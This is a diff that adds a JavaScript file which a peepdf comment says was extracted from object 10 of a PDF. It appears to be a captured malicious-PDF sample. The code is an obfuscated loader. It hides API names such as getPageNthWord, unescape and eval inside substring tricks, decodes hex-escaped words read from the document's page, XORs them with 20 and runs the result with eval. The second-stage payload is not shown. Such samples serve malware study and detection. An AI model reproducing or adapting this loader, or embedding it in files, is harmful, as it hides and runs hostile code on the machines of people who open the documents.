@@ -1,0 +1,40 @@
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+var b = 20;
+var v = new String();;
+var t = "subs7IpE".substr(0, 4) + "tr0f5h".substr(0, 2);
+var f = "vrdgetP".substr(3) + "BYkageN".substr(3) + "7nVthWoV7n".substr(3, 4) + "zXMrd".substr(3);
+
+function j(r, h) {
+    return r ^ h;
+};
+var fM = String;
+var mJ = "aVGune".substr(3) + "sca3QX6".substr(0, 3) + "pe";
+var vU = new String("DAGgetP".substr(3) + "ageNbPtK".substr(0, 4) + "umWoq2ry".substr(0, 4) + "2aprds".substr(3));
+var wD = String("char" + "CodePskM".substr(0, 4) + "At");
+var vO = 1;
+var yJ = "fromJqOQ".substr(0, 4) + "CharingN".substr(0, 4) + "uQfCodeuQf".substr(3, 4);
+var d = this;
+var hG = ["p", "a", "", "p"];
+wR = new String(hG[1] + hG[0] + hG[0] + hG[2]);
+var bQ = ["a", "", "l", "v", "e"];
+aN = new String(bQ[4] + bQ[3] + bQ[0] + bQ[2] + bQ[1]);
+var jS = 27 - 25;
+var gX = 5677 - 5677;
+var vG = String("%LPEi".substr(0, 1));
+var eB = 82 - 81;;
+var x = d[aN];
+var wR = d[wR];
+var jG = d[vU](vO);;
+var eR = d[mJ];
+for (var fE = gX; fE < jG; fE += eB) {
+    qX = d[f](vO, fE);
+    var fA = qX[t](qX.length - jS, jS);
+    var oN = vG + fA;
+    var hO = eR(oN);
+    var qXY = hO[wD](gX);
+    var aZ = j(qXY, b);
+    v += fM[yJ](aZ);
+}
+x(v);
+
